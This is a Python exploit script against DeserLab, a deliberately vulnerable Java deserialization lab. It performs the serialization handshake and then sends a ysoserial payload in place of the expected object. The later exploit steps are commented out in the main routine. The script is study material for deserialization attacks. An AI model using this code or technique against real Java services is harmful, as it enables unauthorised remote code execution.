#!/usr/bin/env python
"""
    DiabloHorn - https://diablohorn.com
    References
        https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/
        https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html
        https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html
        http://gursevkalra.blogspot.nl/2016/01/ysoserial-commonscollections1-exploit.html
        https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
        https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478
        https://www.youtube.com/watch?v=VviY3O-euVQ
        http://wouter.coekaerts.be/2015/annotationinvocationhandler
        http://www.baeldung.com/java-dynamic-proxies
        https://stackoverflow.com/questions/37068982/how-to-execute-shell-command-with-parameters-in-groovy
        https://www.sourceclear.com/registry/security/remote-code-execution-through-object-deserialization/java/sid-1710/technical
"""
import sys
import socket
import argparse
import logging
import struct

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class deser:
    def __init__(self,tip,tport):
        self.targetip = tip
        self.targetport = int(tport)
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def connect(self):
        self.s.connect((self.targetip, self.targetport))
    
    def javaserial(self):
        blob = '\xac\xed\x00\x05'
        self.s.sendall(blob)
        logging.debug("server javaserial resp: %s" % self.s.recv(4).encode('hex'))    
    
    def protohello(self):
        header = self.s.recv(2)
        datalength = int(struct.unpack('B',header[1])[0])
        logging.debug("server proto hello %s" % self.s.recv(datalength).encode('hex'))
        blob = '\x77\x04'
        blob2 = '\xf0\x00\xba\xaa'
        self.s.sendall(blob)
        self.s.sendall(blob2)
        
    def protoversion(self):
        header = self.s.recv(2)
        datalength = int(struct.unpack('B',header[1])[0])
        logging.debug("server version %s" % self.s.recv(datalength).encode('hex'))
        blob = '\x77\x02'
        blob2 = '\x01\x01'
        self.s.sendall(blob)
        self.s.sendall(blob2)
          
    def clientname(self):
        blob = '\x77\x09' #depends on username + type length
        blob2 = '\x00\x07\x74\x65\x73\x74\x69\x6e\x67'
        self.s.sendall(blob)
        self.s.sendall(blob2)
    
    def exploit(self, payload_file):
        """
            Normally this is where the HashRequest object is send
            instead we send a ysoserial payload, skipping the first 4 bytes
        """
        payload = ''
        with open(payload_file, 'rb') as content_file:
            payload = content_file.read()
        self.s.sendall(payload[4:])
        logging.debug('after exploit: %s' % self.s.recv(1024))
        
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Exploit for DeserLab',epilog='https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/')
    parser.add_argument('targetip',help='target ip to exploit')
    parser.add_argument('targetport',help='target port to exploit')
    parser.add_argument('payloadfile',help='file with the ysoserial payload')

    myargs = parser.parse_args()
    logging.getLogger().setLevel(logging.DEBUG)
    logging.debug("target %s" % myargs.targetip)
    logging.debug("port %s" % myargs.targetport)
    mydeser = deser(myargs.targetip, myargs.targetport)
    logging.info("Connecting")
    mydeser.connect()
    logging.info("java serialization handshake")
    mydeser.javaserial()
    #logging.info("protocol specific handshake")
    #mydeser.protohello()
    #logging.info("protocol specific version handshake")
    #mydeser.protoversion()
    #logging.info("sending name of connected client")
    #mydeser.clientname()
    #logging.info("exploiting")
    #mydeser.exploit(myargs.payloadfile)
